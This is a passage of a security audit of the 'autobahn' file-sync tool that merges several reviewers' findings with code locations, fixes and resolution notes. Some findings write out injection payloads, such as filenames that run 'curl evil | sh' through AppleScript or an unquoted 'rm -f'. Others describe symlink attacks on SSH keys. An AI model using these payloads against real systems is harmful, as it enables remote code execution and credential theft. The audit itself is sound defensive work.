- **Where:** `src/scan/mod.rs:857` (single `symlink_metadata`), `:1061` (`read_dir` follows), `:1007` (`digest_file` re-opens by path); completes via `local.rs:841`
- **What:** Path-based traversal with one `lstat` up front, no dirfd anchoring, no dev+ino recheck. A local writer spinning `rename(2)` swaps a real directory for a symlink to `$HOME`; the contents are scanned with real digests and shipped in the same cycle. A file swapped for a FIFO blocks `open()` with `scanning = true`.
- **Fix:** fd-anchored traversal (`openat2` with `RESOLVE_NO_SYMLINKS` on Linux; `O_NOFOLLOW|O_DIRECTORY` plus dirfd-relative ops elsewhere); `fstat` after open and require regular file with matching dev+ino; at minimum re-`lstat` before descending.
- **Resolution (2026-09-24, local users):** File-level swap fixed by [LOCAL-09](fixes/LOCAL-09-scanner-file-opens.md). The directory-level swap is a documented boundary, [LOCAL-10](fixes/LOCAL-10-descriptor-relative-rewrite.md).

### H-25. A sync root may contain the state root and `config.toml`; a peer rewrites the config and live reload runs its hooks

- **Sources:** KIMI ABN-H11 (High, Likely)
- **Where:** `src/config.rs:880` (`plans()` checks overlap between sessions but not against the state root), `src/main.rs:818` (`run_sync`, same gap), `src/scan/mod.rs:59` (scanner hides only `.autobahn-tmp*`)
- **What:** `alpha = "~"` syncs `~/.autobahn/config.toml`, `on-alert.sh`, ancestors and locks as tree content. A later-compromised peer edits `.autobahn/config.toml` in its tree; the next cycle writes it locally; the reloader plans it; the attacker's `agent_command` runs at the next spawn.
- **Fix:** refuse planned endpoints whose resolved identity contains the state root or config file (both in `plans()` and `run_sync`) absent an explicit override; scanner always excludes the state-root subtree when it falls inside a root.

### H-26. `autobahn diff` scratch directory is a predictable, pre-creatable shared-`/tmp` path

- **Sources:** KIMI ABN-H12 (High, Confirmed); DEEPSEEK F16 (Low); GLM L3 (Low); OPUS S8 (Medium, Confirmed)
- **Where:** `src/main.rs:2064-2090`
- **What:** `temp_dir()/autobahn-diff-<pid>`, `create_dir_all` (accepts a foreign-owned directory), then `std::fs::write` (follows symlinks) of both sides under deterministic names, default umask (0644). Cross-UID on Linux: pre-create with a symlink `alpha -> ~/.ssh/authorized_keys` to overwrite it, read both sides' contents, or swap files to poison the comparison before `resolve --keep`. macOS per-user `$TMPDIR` blunts the cross-UID arm.
- **Fix:** 0700 directory that fails if it exists (or the `tempfile` crate, already a dev-dependency); `create_new`/`O_NOFOLLOW` writes.
- **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-04](fixes/LOCAL-04-diff-scratch.md).

### H-27. AppleScript injection via `$AUTOBAHN_SUMMARY` in the shipped `on_alert` example: remote peer to local code execution

- **Sources:** GLM H1 (High); DEEPSEEK F9 (Medium); OPUS S9 (Medium, Confirmed)
- **Where:** `src/config.rs:162-163` (`ON_ALERT_EXAMPLE`, written by `autobahn init`), executed by `src/alerts.rs:488-491`; summary composed at `src/alerts.rs:330-350`, `src/supervisor/mod.rs:1909,2157-2184`, `src/supervisor/reload.rs:237-243`
- **What:** The example runs `osascript -e "display notification \"$AUTOBAHN_SUMMARY\" ..."` with no escaping. The summary embeds `status.error`, which embeds peer-controlled filenames and raw error text (including TOML parse errors). A filename `x" & (do shell script "curl evil|sh") & "` executes as the local user on the next alert. The dispatcher itself passes values by environment, correctly; `src/tray.rs:785-790` shows the right escaping. Only fires if the user enables the example hook (shipped commented out) and `terminal-notifier` is absent.
- **Fix:** escape `\` and `"` in `AUTOBAHN_SUMMARY`/`AUTOBAHN_DETAIL` at composition time and fix the example to pass text via argv; truncate and strip control characters from error text before it enters the alert environment.

### H-28. Release channel is checksums-only, from the same origin, with no signature; compromise is fleet-wide code execution

- **Sources:** GLM H2 (High); DEEPSEEK F8 (Medium); KIMI ABN-M18 (Medium, Confirmed); OPUS S6 (Medium, Confirmed); KIMI ABN-I3
- **Where:** `src/update.rs:29-33,106-131,336-339,448-451,483-493,590-591`, `scripts/install.sh:62,80,110,113,168`
- **What:** `SHA256SUMS` is fetched from the same release as the artifacts. No minisign/GPG/cosign, no pinned digest, no tag-immutability check. The downloaded binary is executed (`--version` smoke run) and the login service restarted onto it. `transport::install::ensure_agent` then streams the same release's agent bundle to every remote host and executes it. macOS artifacts are Developer-ID signed and notarized but neither `update` nor `install.sh` verifies that; Linux binaries are unsigned. `tar xzf` extraction has no member validation (second-order).
- **Fix:** sign releases with an offline key pinned in the binary and installer, or publish build attestations; verify before checksum comparison in both `update.rs` and `install.sh`; `codesign --verify` on macOS; validate tar members.
- **Resolution (2026-09-24):** Decided, [REL-1](fixes/REL-1-release-integrity.md). Step 1 fixes the installer half, and step 2 adds signing.

### H-29. Blocked-path prefixes are interpolated unquoted into the `sudo chown` fix command the TUI copies to the clipboard

- **Sources:** DEEPSEEK F3 (High, paste-gated); KIMI ABN-M14 (Medium, Likely); OPUS S9 (Medium, Confirmed); ASTRA hardening note
- **Where:** `src/main.rs:1592-1616` (`blocked_fix`), `src/shop.rs:446-459` (`copy_fix`)
- **What:** `ssh {destination} 'sudo chown -R {user} {root}/{where_}'` and `sudo chown -R "$(whoami)" {spec}/{where_}` are built with `where_` from on-disk names chosen by the other side. `;`, backticks, `$(...)`, `|`, newline, or `'` inject. The paste-and-run flow is the documented purpose. Incidental bug: `user` is set to the hostname when the destination has no `@`.
- **Fix:** shell-quote every interpolated component; reject or elide prefixes outside a conservative charset; or execute structured fixes directly instead of round-tripping the clipboard.

### H-30. Peer-controlled strings reach `resolve` as flags (no `--`)

- **Sources:** OPUS S10 (Medium, Confirmed)
- **Where:** `src/tray.rs:717,726`, `src/shop.rs:437`
- **What:** The tray and shop run `resolve <group> <path> --keep ...` without `--`, so a top-level file named `--all` settles every conflict in the group.
- **Fix:** insert `--` before positional arguments.

(Placed in High because it turns a filename into a data-affecting CLI action; OPUS rated Medium.)

### H-31. The attached alpha accepts files pushed by the leader, which can turn it into a follower of the leader's config

- **Sources:** none of the six reviews. Found during the 2026-09-24 walkthrough.
- **Where:** `src/transport/mod.rs:965` (`attach_as_agent` runs the full `serve_agent`), `:643` (`PutPeeringFile`), `src/supervisor/mod.rs:1024` (a genuine leader deliberately never pushes to the alpha), `src/main.rs:1501` (the startup refusal)
- **What:** A hostile leading beta pushes `name` and `config.toml` into the alpha's `~/.autobahn/peering/`. The alpha then refuses to start, and the error tells the user to move one of the two configs aside. If the user moves their own config aside, the alpha runs the attacker's config, including its `agent_command`, at the next failover.
- **Resolution:** deferred past v1. Ticket [PEER-2](fixes/PEER-2-no-pushes-into-alpha.md). A workaround is in `docs/peering.md`.

---

## Medium

### Security: local IPC and multi-user hosts

#### M-1. Peering attach socket: no peer-credential check, no chmod, no timeout, unbounded greeting

- **Sources:** DEEPSEEK F5; GLM M1; KIMI ABN-M1 (Confirmed); OPUS S4 (Confirmed)
- **Where:** `src/supervisor/peer.rs:127-133` (bind), `:206-227` (`accept_attachment`)
- **What:** The one place the wire protocol runs without SSH. Socket mode is whatever umask gives; auth is the plaintext greeting `alpha`; `read_line` is unbounded on a serial accept loop; no `SO_PEERCRED`. On macOS socket file modes are not enforced at connect. A connecting process becomes the alpha endpoint (reads pushed content, injects fabricated trees, can drive `Initialize`, see H-18). A silent client wedges the accept loop; a newline-free stream grows memory. Contrast `control.rs:262-276,300-336`, which does this correctly.
- **Fix:** mirror the control socket: 0600 socket, 0700 directory, same-uid credential check, read/write timeouts, greeting cap, per-connection thread.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-5](fixes/PEER-5-attach-socket.md). Documented in `docs/peering.md`.

#### M-2. Control-socket `/tmp` fallback directory can be pre-created or spoofed by another user

- **Sources:** DEEPSEEK F6; GLM L6; KIMI ABN-M12 (Confirmed); OPUS Low
- **Where:** `src/supervisor/control.rs:238-276`
- **What:** When the state root path exceeds ~100 bytes the socket moves to `temp_dir()/autobahn-<uid>/<name>.sock`. `create_dir_all` accepts a foreign-owned directory; the 0700 chmod and `remove_file` failures are discarded. The attacker's listener then receives `status`/`flush`/`shop`/tray requests and returns crafted responses (which chain into M-6). The client never checks the server's uid.
- **Fix:** verify ownership and mode with `symlink_metadata` and refuse otherwise; `O_EXCL` creation; never swallow chmod/unlink failures; prefer `$XDG_RUNTIME_DIR`.
- **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-05](fixes/LOCAL-05-control-socket-fallback.md).

#### M-3. Staging directories and temporaries are world-readable, use predictable names, and follow planted symlinks

- **Sources:** ASTRA F18 (P2); KIMI ABN-M4 (Confirmed) and ABN-M2 (Likely); OPUS S3 (Confirmed); DEEPSEEK F10 and F17
- **Where:** `src/endpoint/local.rs:954-957` (`open_receive_file`), `:1107-1111` (`stage_begin`), `:2221-2233`, `:2296`, `:2768` (temp name), `:2969-2972`; `src/scan/mod.rs:612-615`
- **What:** Staging root is `create_dir_all` (0755), blobs are `File::create` (0644) under umask 022; final 0600 applies only at publish. `BesideRoot` staging lives in the root's parent. Temp names are `.autobahn-tmp-<purpose>-<pid>-<counter>` (pid visible; leaked in error strings at `:957`), no `O_EXCL`/`O_NOFOLLOW`; a pre-planted symlink makes the transfer truncate and write an arbitrary file, with the BLAKE3 check running after. `set_permissions(&staged)` runs before the regular-file check. DEEPSEEK's inside-root variant: the staging name derives from session/side (H-18), a peer plants a symlink of that name inside the root (scan-invisible forever), and every staged blob writes through it. Interrupted transfers leave readable temporaries.
- **Fix:** 0700 staging directories (refuse a pre-existing looser or foreign one) and 0600 files from first open; `create_new`/`O_NOFOLLOW`; require `symlink_metadata(staging_root)` be a real directory; keep temporaries out of the synced tree; stop embedding temp paths in peer-visible errors; test incomplete transfers under a permissive umask.
- **Correction (2026-09-24):** The inside-root symlink arm is a Tier 1 fault, fixed by [T1-4](fixes/T1-4-reserved-names-and-staging-root.md). The root cause is that `validate_name` lets a peer create names with the `.autobahn-tmp` prefix, which the scanner then hides forever. T1-4 refuses what the scanner hides and verifies the staging root's type and owner. It also creates staging directories `0700` and, rather than refusing, tightens looser ones left by older versions. The predictable-name and pre-planted-symlink arms outside the root remain local-attacker items.
- **Resolution (2026-09-24, local users):** The temporaries half is a fault, fixed by [LOCAL-03](fixes/LOCAL-03-staging-temporaries.md).

#### M-4. Tray "Show diff" writes peer-influenced content to a predictable shared-temp path; notifier resolved from `PATH`

- **Sources:** KIMI ABN-M16 (Likely); DEEPSEEK F20 (Low); OPUS S8; GLM L8
- **Where:** `src/tray.rs:729-736`, `:838-862`; clipboard helpers `src/shop.rs:801-830`
- **What:** `temp_dir()/autobahn-diff-<path with / → _>.diff` via symlink-following `std::fs::write`; name collisions (`a/b` vs `a_b`); world-readable leftovers. `which_notifier()` walks `PATH`.
- **Fix:** per-user 0700 directory, `create_new`/`O_NOFOLLOW`, hash the name; absolute notifier path or document the reliance.
- **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-04](fixes/LOCAL-04-diff-scratch.md).

#### M-5. Apply-side check-then-act: no `openat`/`RESOLVE_BENEATH` confinement; chmod follows a swapped symlink

- **Sources:** KIMI ABN-M3 (Likely); DEEPSEEK F14 (Low) and F15 (Low)
- **Where:** `src/endpoint/local.rs:1882-1903` (`resolve_parent` lstat-walks), re-walks at `:2026` (`create_dir`), `:2083` (`symlink`), `:2231,2901-2964` (`publish_rename`), `:2379,2547` (`remove_*`), `:2585-2607` (`set_permissions`, follows symlinks; `apply_ownership` uses `lchown` correctly at `:2333-2341`); `:1334-1372` (`read_file`/`rename` skip the per-component walk)
- **What:** A local actor renaming entries mid-transition swaps a verified directory for a symlink and redirects the operation outside the root; with a root-running agent (the deployment `default_owner` exists for) this is arbitrary root file replace/chmod. `read_file`/`rename` use `create_dir_all` + `fs::rename`, both of which follow a symlinked parent.
- **Fix:** pin the parent as an `O_DIRECTORY|O_NOFOLLOW` fd and use `renameat`/`unlinkat`/`fchmodat(AT_SYMLINK_NOFOLLOW)`; `open(O_NOFOLLOW)` + `fchmod`; route `read_file`/`rename` through `verify_directory`.
- **Correction (2026-09-24):** The `read_file`/`rename` part does not need a race or a local attacker, as the reviews assumed. A peer creates `root/link -> /home/you` under the default Raw symlink mode. `ReadFile("link/.ssh/id_ed25519")` then returns the key, and a keep-both rename through `link/` moves files outside the root. That part is a Tier 1 fault, fixed by [T1-3](fixes/T1-3-confined-read-and-rename.md). The check-then-use race in the transition path is still a local-attacker item.
- **Resolution (2026-09-24, local users):** The race half is a documented boundary, [LOCAL-10](fixes/LOCAL-10-descriptor-relative-rewrite.md). The non-race half is T1-3.

#### M-6. Terminal escape-sequence injection from tree- and peer-controlled strings

- **Sources:** GLM M8; KIMI ABN-M13 (Confirmed); OPUS S11 (Confirmed); DEEPSEEK F19 (Low); ASTRA hardening note
- **Where:** `src/pager.rs:142-170` (`truncate` keeps escapes), `src/main.rs:1766-1894`, `3370-3403`, `src/shop.rs:539-652,780,1095-1099,1500-1530`, `src/transport/mod.rs:130-146` (relayed agent stderr printed verbatim), status JSON → `status --live`
- **What:** POSIX names may contain anything but NUL and `/`. A filename with OSC 52 writes the clipboard; OSC 8 disguises links; CSI/CR repaints a fake "settled" line to coax `resolve --yes`. The escape-preserving width logic exists for autobahn's own colors but passes attacker sequences.
- **Fix:** one sanitize helper (C0/C1/ESC/BEL/DEL) applied to every tree- or peer-derived string at the presentation layer, including relayed stderr; raw bytes only in `--json`.

#### M-7. Log injection: forged log lines and escapes via filenames

- **Sources:** KIMI ABN-M15 (Likely); GLM L9
- **Where:** `src/supervisor/mod.rs:1746`, `src/logging.rs:96-142`
- **What:** Newlines in names split a logged path into attacker-composed lines without timestamps.
- **Fix:** escape non-printing characters at the log macros.

#### M-8. Remote `rm -f` prune script interpolates directory-listing output unquoted

- **Sources:** DEEPSEEK F4; GLM M7; ASTRA hardening note; OPUS Low
- **Where:** `src/transport/install.rs:296-318` (`prune_agents`), executed via `:355-369`
- **What:** Names are filtered only by `starts_with("autobahn-") && !contains('/')`, then joined into `rm -f {names}`. `autobahn-x; curl evil | sh` passes and executes as the SSH user. The adjacent comment claims exact-name-only removal. Prerequisite is write access to the remote `~/.autobahn/bin`.
- **Fix:** allowlist `[A-Za-z0-9._+-]` and shell-quote each path.

#### M-9. SSH inherits the user's `ssh_config` for connections that last days; host-key policy delegated

- **Sources:** OPUS S5 (Confirmed); GLM L1; KIMI ABN-I4
- **Where:** `src/transport/mod.rs:73-84`
- **What:** Only `BatchMode`, `ServerAlive*`, `Compression` are set. `ForwardAgent yes` exposes the controller's agent to the remote for the supervisor's lifetime; `RequestTTY force` corrupts the stream; `LocalForward` plus `ExitOnForwardFailure` breaks reconnects. `StrictHostKeyChecking` is unset (fail-closed by default with BatchMode, but a permissive user config removes MITM protection, making H-6/H-19 and the 4 GiB cap network-triggerable).
- **Fix:** add `-T -o ForwardAgent=no -o ForwardX11=no -o ClearAllForwardings=yes -o PermitLocalCommand=no -o ConnectTimeout=...`; consider `StrictHostKeyChecking=accept-new` explicitly and document it.

### Security: resource exhaustion and missing bounds

#### M-10. 4 GiB message-reassembly ceiling enables memory exhaustion from a small wire footprint

- **Sources:** DEEPSEEK F12 (Low); GLM M4; KIMI ABN-M7 (Likely); OPUS quality note (I9 text stale)
- **Where:** `src/transport/mod.rs:1017` (`MAXIMUM_MESSAGE_SIZE`), `:1173-1190`
- **What:** Frames are capped before allocation, but a message reassembles from any number of frames up to 4 GiB in one `Vec` (~255× lz4 amplification from ~16 MiB on the wire, ~8 GiB transient during growth, then bincode can amplify further). Symmetric both directions.
- **Fix:** lower the ceiling to the largest legitimate message, or per-type decode caps (`bincode::options().with_limit`), release partial buffers on channel failure.

#### M-11. Unbounded `MuxRequest::Open`: thread, fd and watcher exhaustion

- **Sources:** DEEPSEEK F24 (Low); KIMI ABN-M8 (Confirmed)
- **Where:** `src/transport/mod.rs:438-458`
- **What:** One scoped thread and `LocalEndpoint` (with a watcher) per Open, no cap; failed opens leave stale routing entries.
- **Fix:** cap concurrent channels per connection; remove routing entries when a channel exits unanswered.
- **Note (2026-09-24):** On the peering attach path a remote leader can trigger this. That case is deferred past v1 with ticket [PEER-1](fixes/PEER-1-attach-policy.md). The channel cap for ordinary agents stays open.

#### M-12. No timeouts on any request/response or connection-setup path; pool and writer locks held across blocking I/O

- **Sources:** KIMI ABN-M9 (Confirmed); OPUS M6 (Confirmed), M5 (Confirmed), M14 (Likely)
- **Where:** `src/transport/mux.rs:126-132,253,390-396,605-636`; `src/transport/install.rs`; `src/transport/mod.rs:446-461,540-748`; `src/supervisor/control.rs:369-383`; `src/tray.rs:325-362`
- **What:** No `ConnectTimeout`; handshake read, platform probe, upload and channel-open have no deadlines while the per-host pool lock is held, so one hung login (NFS rc file, conda init) blocks every session to that host. A live-but-mute agent wedges every session on the pooled connection with no error, so no retry or alert. A panic in an agent channel thread never sends a response, and the controller waits forever. Client control-socket calls have no timeout, so a wedged supervisor freezes `status`, the shop and the tray event loop.
- **Fix:** `recv_timeout` on open/exchange (fail the connection); `ConnectTimeout`; do not hold the pool lock across network operations; client timeouts.

#### M-13. Remote stderr relayed with unbounded line buffering

- **Sources:** KIMI ABN-M10 (Confirmed); GLM L8; OPUS Low ("stderr relay stops early")
- **Where:** `src/transport/mod.rs:114,131-136`
- **What:** `HELD_STDERR_LINES = 64` caps count, not bytes; a newline-free stream grows controller memory pre-handshake. Separately, the relay stops at the first non-UTF-8 line and later diagnostics are lost.
- **Fix:** bounded reads with truncation; lossy decoding.

#### M-14. Unbounded receive: no per-file or per-stream byte cap when staging peer content

- **Sources:** KIMI ABN-M5 (Confirmed)
- **Where:** `src/endpoint/local.rs:905-951,986-1008`
- **What:** `FileRequest` carries no expected size; op count is unlimited; digest checked only at `EndOfFile`. A hostile supplier fills the staging volume.
- **Fix:** carry expected size, refuse bytes beyond size plus tolerance, cap per-stream totals, treat overrun as a protocol error.

#### M-15. Snapshot delta streams have no aggregate or progress bound

- **Sources:** KIMI ABN-M6 (Confirmed)
- **Where:** `src/endpoint/remote.rs:221-236,251-258`
- **What:** Zero-byte ops are accepted as no-ops so the `output.len() > header.length` guard never fires; a hostile agent answers every `ScanPull` with non-empty no-op batches forever. Session wedges silently.
- **Fix:** require byte progress per batch; cap total ops relative to `header.length`; fail the connection on violation.

#### M-16. `digest_file` opens by path without `O_NOFOLLOW` and reads without a bound

- **Sources:** KIMI ABN-M17 (Confirmed); OPUS Low (FIFO blocks `open()`)
- **Where:** `src/scan/mod.rs:1007-1022`
- **What:** The `max_file_size` check uses the earlier `lstat`. A swapped-in FIFO blocks forever; a symlink to `/dev/zero` reads forever; a continuously appended file never terminates. Permanent per-session outage.
- **Fix:** `O_NOFOLLOW` + `fstat` regular-file and dev/ino check; bound the read by lstat size plus slack; per-file wall-clock budget.
- **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-09](fixes/LOCAL-09-scanner-file-opens.md).

### Security: supply chain, install and CI

#### M-17. `install.sh` never verifies the agent bundle and installs unverified when the checksum fetch fails

- **Sources:** DEEPSEEK F7; GLM M6; KIMI ABN-M18 (Confirmed); OPUS S6 (Confirmed); ASTRA hardening note
- **Where:** `scripts/install.sh:135-174`
- **What:** The binary is checked against `SHA256SUMS`; `autobahn-agents.tar.gz` is not, though the release publishes an entry and `update.rs:127-131` verifies it. The `else` branch conflates "release publishes no checksums" with "download failed" and installs anyway, while `update` refuses. The bundle is the highest-blast-radius asset (pushed to every remote host) and gets the weakest check on the first-install path.
- **Fix:** verify the bundle; distinguish fetch failure from asset absence and refuse on failure; explicit `--insecure`/`--allow-unverified` opt-in for the absent case.
- **Resolution (2026-09-24):** Fault, fixed in v1 by step 1 of [REL-1](fixes/REL-1-release-integrity.md).

#### M-18. Update workspace in shared `/tmp` with default permissions (TOCTOU), no downgrade floor, `GH_HOST`/`GH_TOKEN` redirect the trust root, `--version` tag into `gh` argv without `--`

- **Sources:** KIMI ABN-M18 sub-items (Confirmed); OPUS S8; DEEPSEEK F21 (Low)
- **Where:** `src/update.rs:721-731` (workspace), `:399,457` (re-read after checksum), `:565-575` (`gh` transport), `:641-649` (tag argv)
- **What:** `create_dir_all` accepts a foreign-owned directory; the staged binary is 0644 and re-read after checksumming (exec at `:457`, copy at `:399` after the slow bundle refresh). No downgrade refusal. A tag beginning with `-` reads as a `gh` option (self-inflicted).
- **Fix:** 0700 + fail-if-exists (as `install.sh`'s `mktemp -d` does); re-verify before `place_binary`; refuse downgrades unless explicit; pin release host; validate the tag against `^v?[A-Za-z0-9._-]+$`.
- **Resolution (2026-09-24, local users):** The workspace part is a fault, fixed by [LOCAL-06](fixes/LOCAL-06-update-workspace.md). Downgrade floor and `GH_HOST` stay open as supply-chain items.

#### M-19. CI executes an unpinned third-party jar, has no top-level `permissions:` block, pins actions to mutable tags, and the secret-holding mac job has a write token

- **Sources:** KIMI ABN-M19 (Confirmed/Likely) and ABN-L14; DEEPSEEK F22 (Low); OPUS S7 (Confirmed)
- **Where:** `.github/workflows/ci.yml:81`, `spec-full.yml:22`, `spec/check.sh:15-18` (tla2tools.jar from `releases/latest`, no pin, no checksum); `ci.yml`/`spec-full.yml` (no `permissions:`); `release.yml:20` (`contents: write` for all jobs including `mac`), `:147-153` (tray `cargo build` runs build scripts while the Developer ID keychain is unlocked); all third-party actions on mutable tags
- **Fix:** pin tag + SHA-256 or vendor the jar; `permissions: contents: read` at top with `write` only on the release job; SHA-pin actions plus dependabot for actions; compile before importing secrets.

#### M-20. Bench scripts use predictable shared-`/tmp` work dirs; a config swap yields command execution

- **Sources:** KIMI ABN-M20 (Likely)
- **Where:** `bench/git-sync.sh:15-16`, `bench/ab.sh:39,65,117-125` (`alpha-bench.sh`/`smoke.sh` correctly use `mktemp -d`)
- **What:** `rm -rf` + `mkdir -p` under `set -u` without `-e`; a foreign-owned directory survives and the script writes a config containing `agent_command` there, then launches `watch`.
- **Fix:** `mktemp -d`, `set -euo pipefail`, verify ownership.
- **Resolution (2026-09-24, local users):** Fault, fixed by [LOCAL-07](fixes/LOCAL-07-bench-work-dirs.md).

#### M-21. Service arguments are not safely serialized: systemd unit built by string concatenation, relative paths kept

- **Sources:** ASTRA F26 (P2); DEEPSEEK F11 (Low); KIMI ABN-L2 (Low, Confirmed); OPUS M16 (Confirmed) and M15 (Confirmed)
- **Where:** `src/service.rs:100-105,427-446`; `src/main.rs:595,606`
- **What:** `ExecStart`, `Environment="AUTOBAHN_HOME=..."`, `StandardOutput` are interpolated with no quoting. A space splits arguments; `"` breaks the quoting; a newline injects directives; `%` is expanded; `AUTOBAHN_HOME=/x" "LD_PRELOAD=...` splits into two assignments. Relative `--config`/`--state-root` are stored without absolutizing, so the login service resolves them against a different cwd. `start`/`restart` validate the default config, not the `--config` baked into the unit. The macOS plist path escapes XML correctly.
- **Fix:** resolve paths at install; escape per systemd rules; reject newlines; validate the unit's actual config.

### Correctness and reliability

#### M-22. Disabled sessions are deleted by `clean`

- **Sources:** ASTRA F13 (P2, confirmed via `clean --dry-run`)
- **Where:** `src/main.rs:2839`
- **What:** Cleanup derives retained state from active plans; disabled groups/hosts are absent, so their ancestor/session directory, status record and endpoint lock are selected for removal. Re-enabling starts without provenance and can resurrect deletions.
- **Fix:** preserve configured-but-disabled identities separately from runnable plans. Test sync → disable → clean → enable, and prove history survives.

#### M-23. Cached scans bypass per-caller entry limits

- **Sources:** ASTRA F14 (P2, Reproduced)
- **Where:** `src/endpoint/observer.rs:346`
- **What:** The shared observer returns a published snapshot before checking the requester's `max_entry_count` (the observer key excludes it). A permissive caller warms the cache for a stricter one; a two-entry snapshot was accepted by a one-entry endpoint.
- **Fix:** apply caller-specific limits on every return including cache hits.

#### M-24. Polling fallback serves stale snapshots for up to 120 s instead of the 5 s interval

- **Sources:** ASTRA F15 (P2, Reproduced); OPUS M7 (Confirmed)
- **Where:** `src/endpoint/observer.rs:346-351`
- **What:** Cache reuse does not require an active watcher. With watch establishment failed (e.g. `max_user_watches` exhausted) or one-shot mode, external writes do not advance the generation. Creating a second file did not change the next scan's count.
- **Fix:** require an active, healthy watcher before treating an unchanged generation as freshness; polling must walk.

#### M-25. Linux watchers ignore re-included descendants

- **Sources:** ASTRA F16 (P2); OPUS M8 (Reproduced)
- **Where:** `src/endpoint/local.rs:233-238`, `src/scan/mod.rs:875`
- **What:** The scanner descends through an ignored directory when `holds_a_re_inclusion` requires it; watcher registration stops at any ignored directory. `vendor` + `!vendor/keep.txt` syncs initially but edits wait for the full walk.
- **Fix:** share the scanner's traversal policy with watcher registration; Linux regression test.

#### M-26. Dynamic watch-registration failures are discarded

- **Sources:** ASTRA F17 (P2); OPUS M10 (Confirmed)
- **Where:** `src/endpoint/local.rs:401-408`
- **What:** `let _ = watch_tree(...)` for newly created or renamed directories. Hitting the inotify limit after startup leaves partial coverage marked healthy, no log line, no polling fallback, no retry. Contradicts the startup contract at `:205-209`.
- **Fix:** surface through observer health, report, poll, retry.

#### M-27. A replaced root keeps a dead watcher until restart

- **Sources:** OPUS M9 (Reproduced)
- **Where:** observer and watcher
- **What:** After `mv A A.old && cp -a A.old A`, every later edit waits for the full scan and events from `A.old` mark unrelated paths.
- **Fix:** record the root's `(dev, ino)`; rebuild on `MoveSelf`/`DeleteSelf` or mismatch.

#### M-28. A failed scan loses the dirty marks it consumed

- **Sources:** OPUS M18 (Confirmed)
- **Where:** `src/endpoint/observer.rs:392,401-409`
- **What:** `result?` returns after `take_dirty` without resetting `last_full_scan`; the per-caller `max_entry_count` bail returns before the baseline is updated.

#### M-29. Concurrent publishing can prematurely move shared staged content

- **Sources:** ASTRA F19 (P2); OPUS Low
- **Where:** `src/endpoint/local.rs:2181-2240`
- **What:** The staged-use counter decrements before the publisher opens the source. With two users of one digest, the last decrementer renames the blob before the first opens it: spurious "staged content unavailable", retransfer, extra cycle.
- **Fix:** open before decrementing, or wait for earlier users.

#### M-30. Leftover `.autobahn-tmp-apply-*` files are never cleaned up and wedge directory deletion

- **Sources:** OPUS M3 (Confirmed)
- **Where:** `src/endpoint/local.rs:2233,2498-2509`; `src/scan/mod.rs:612`
- **What:** The scan hides them; `remove_directory` treats one as unexpected content, a disagreement, so the baseline is distrusted and a full walk runs every cycle indefinitely. They also leak GBs after a crash mid-copy.

#### M-31. A staging base that changes mid-stream fails the whole cycle

- **Sources:** OPUS M11 (Confirmed)
- **Where:** `src/endpoint/local.rs:922-973`; `src/rsync/mod.rs:379-398`
- **What:** A destination base truncated between `stage_begin` and the push makes `patch` hit EOF and the entire staging stream errors. Source-side changes are handled quietly; this should be too.
- **Fix:** discard that file and retransfer.

#### M-32. A corrupted length field in a middle journal record is read as a torn tail; later records are dropped permanently

- **Sources:** OPUS M1 (Confirmed)
- **Where:** `src/session/ancestor.rs:727-739`
- **What:** The digest covers generation and payload but not the length. Every later acknowledged record is dropped and normalization makes it permanent, rolling the ancestor back silently.
- **Fix:** checksum the header; treat the file as torn only when the header is valid.

#### M-33. One-way modes never converge when the beta copy holds ignored content

- **Sources:** OPUS M2 (Likely)
- **Where:** `src/tree/reconcile.rs:566-570,656-660`
- **What:** The deletion's `old` is `beta.cloned()`, not `beta_sync`. Removal refuses, the next cycle re-proposes it, forever. `unsynchronizable_content_never_travels` checks only `new`.

#### M-34. A worker panic kills a session silently; logging can panic on EPIPE/ENOSPC

- **Sources:** OPUS M4 (Confirmed)
- **Where:** `src/supervisor/mod.rs:706-760`; `src/logging.rs:115-140`
- **What:** `println!`/`eprintln!` panic when `watch` is piped to a process that exits or the disk under `service.log` is full. No `catch_unwind`; the status file keeps saying "synchronized" and no alert fires.

#### M-35. Alert hooks can hang forever, and their stderr is lost

- **Sources:** OPUS M12 (Confirmed)
- **Where:** `src/alerts.rs:488-523`
- **What:** `stdin.write_all` runs before the timeout loop, so a hook that does not read stdin blocks indefinitely and later alerts are skipped. stderr is piped and never read although `docs/alerts.md` says it goes to the log.

#### M-36. `sync` exits 0 with conflicts or blocked paths

- **Sources:** OPUS M13 (Confirmed)
- **Where:** `src/main.rs:952-986,1165-1190`
- **What:** The docs sell `sync` for scripts that need a status code.

#### M-37. The remote install script assumes a POSIX login shell

- **Sources:** OPUS M17 (Likely)
- **Where:** `src/transport/install.rs:213-221`
- **What:** `tmp=…`, `$$` and `{ …; }` fail under fish and tcsh, so those hosts can never be bootstrapped. The fake-ssh test runs `/bin/sh -c` so it cannot see this.
- **Fix:** wrap in `sh -c '…'`.

#### M-38. Rejected configuration breaks status visibility

- **Sources:** ASTRA F27 (P2)
- **Where:** `src/main.rs:3118,1971`; `src/shop.rs:190`
- **What:** Status and UI parse the edited on-disk config before reading the still-running inventory or rejection notice; a syntax error hides the sessions the supervisor deliberately retained. An open TUI keeps its original plan list after a topology reload.
- **Fix:** expose the supervisor's active inventory independently of the candidate config.

#### M-39. Containment checks miss the filesystem root and trailing separators

- **Sources:** ASTRA F23 (P2)
- **Where:** `src/config.rs:697,1371`
- **What:** String-prefix containment strips the outer path and requires the remainder to begin with `/`; outer `/` and inner `/srv/project` leave `srv/project`. Remote roots ending in `/` have the same problem.
- **Fix:** separate remote authority from path, normalize, component-aware ancestry.

#### M-40. Updater rollback restores only the CLI binary, not the agent bundle

- **Sources:** ASTRA F24 (P2); OPUS Low
- **Where:** `src/update.rs:137-146,239,383,395-405`
- **What:** The bundle is refreshed and the previous one deleted before the CLI is installed. If restart fails, the rolled-back controller bootstraps agents from the incompatible new bundle and fails version handshakes.
- **Fix:** roll back binary and bundle together as one recoverable operation.

#### M-41. Updater success does not establish that the service runs the updated executable

- **Sources:** ASTRA F25 (P2)
- **Where:** `src/update.rs:791`; `src/service.rs:98`
- **What:** Service install records `current_exe`; update defaults to `~/.local/bin`. A service installed elsewhere restarts its old binary and passes the "running" check.
- **Fix:** resolve or retarget the registered executable; verify the running version.

#### M-59. A detached mount under `ignore_mounts = false` reports "synchronized" while the two sides differ

- **Sources:** new, found on macOS during MAC-BENCH 4 (2026-09-24)
